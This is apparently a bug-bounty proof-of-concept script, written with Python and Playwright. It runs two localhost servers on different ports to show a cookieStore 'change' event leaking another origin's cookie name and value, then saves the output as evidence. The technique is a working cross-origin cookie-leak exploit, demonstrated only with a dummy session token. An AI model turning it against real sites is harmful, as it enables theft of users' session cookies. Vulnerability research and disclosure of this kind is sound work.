import asyncio, json, threading, sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from playwright.async_api import async_playwright

# Two minimal servers on the same host, different ports = different Web Origins.
class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_GET(self):
        self.send_response(200); self.send_header('Content-Type','text/html'); self.end_headers()
        self.wfile.write(b"<!doctype html><meta charset=utf-8><title>p</title><body>ok</body>")

def serve(port):
    HTTPServer(('127.0.0.1', port), H).serve_forever()

for p in (9101, 9102):
    threading.Thread(target=serve, args=(p,), daemon=True).start()

ATT="http://127.0.0.1:9101/"   # attacker origin
VIC="http://127.0.0.1:9102/"   # victim origin (different port)

async def main():
    async with async_playwright() as p:
        eng = sys.argv[1] if len(sys.argv)>1 else 'firefox'
        if eng=='chromium':
            b = await p.chromium.launch(headless=True)
        else:
            b = await p.firefox.launch(headless=True, firefox_user_prefs={"dom.cookieStore.enabled": True})
        ctx = await b.new_context()
        lines=[]
        def out(s): print(s); lines.append(s)

        out("=== Bug 03 CONFIRMED VECTOR — document cookieStore change event cross-port ===")
        out("Attacker origin: "+ATT+"   Victim origin: "+VIC+"  (same host, different port)")
        out("Test: attach change-listener at attacker origin, THEN set fresh cookie at victim origin.\n")

        # Attacker page attaches the change listener
        att = await ctx.new_page()
        await att.goto(ATT, wait_until="domcontentloaded")
        httponly_seen = await att.evaluate("""async () => {
            window.__ev=[];
            cookieStore.addEventListener('change', e => {
                for (const c of (e.changed||[])) window.__ev.push({name:c.name, value:c.value});
            });
            return 'listener-attached';
        }""")
        out("[attacker:9101] "+httponly_seen+" via cookieStore.addEventListener('change')")

        # Victim page sets BOTH a JS cookie and observe HttpOnly is excluded
        vic = await ctx.new_page()
        await vic.goto(VIC, wait_until="domcontentloaded")
        await vic.evaluate("""async () => {
            await cookieStore.set({name:'victim_session', value:'SESSTOKEN_set_at_9102', path:'/', sameSite:'lax'});
        }""")
        # Set an HttpOnly cookie via a fetch to a route? Our minimal server doesn't set one.
        await asyncio.sleep(2)
        await vic.close()

        ev = await att.evaluate("window.__ev || []")
        out("\n[attacker:9101] change events received for cookies set at :9102:")
        for e in ev:
            out("   CHANGED  name='%s'  value='%s'   <- set by DIFFERENT ORIGIN :9102" % (e['name'], e['value']))
        hit = any(e['name']=='victim_session' for e in ev)
        out("\nRESULT: " + ("CONFIRMED — cross-port change event delivered name+value."
                            if hit else "NOT REPRODUCED."))
        out("Note: listener was attached BEFORE the cookie was set, so this is the push")
        out("      'change' event firing — not a getAll() snapshot.")
        await b.close()

        evname = "document_vector_confirmed.txt" if eng!="chromium" else "chromium_document_vector_confirmed.txt"
        open("/home/sn0x/bb/CVE/FIREFOX/03-cookiestore-sibling-leak/evidence/"+evname,"w").write(
            "\n".join(lines)+"\nCaptured: "+eng+" (Playwright), "+__import__('time').strftime('%Y-%m-%d')+"\n")

asyncio.run(main())
